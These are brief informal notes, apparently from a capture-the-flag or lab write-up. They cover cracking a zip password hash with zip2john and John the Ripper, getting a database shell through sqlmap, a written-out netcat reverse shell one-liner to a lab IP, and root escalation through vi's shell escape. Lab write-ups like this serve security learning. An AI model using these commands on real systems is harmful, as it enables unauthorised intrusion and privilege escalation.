## Key Takeaways
1. Got a password protected zip and dumped the hash using zip2john
2. Can crack using john the ripper now and a wordlists
3. john the ripper couldnt figure out format i passed in Raw-MD5
5. we got some crazy thing such as sqlmap where i pass os-shell and cookie to get postgres access
6. GOATED reverse shell mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.129 4444 > /tmp/f
7. stty raw -echo; fg stty sane to go back export TERM=xterm
8. I had vi permissions, i can use it so spawn :!/bin/bash as root
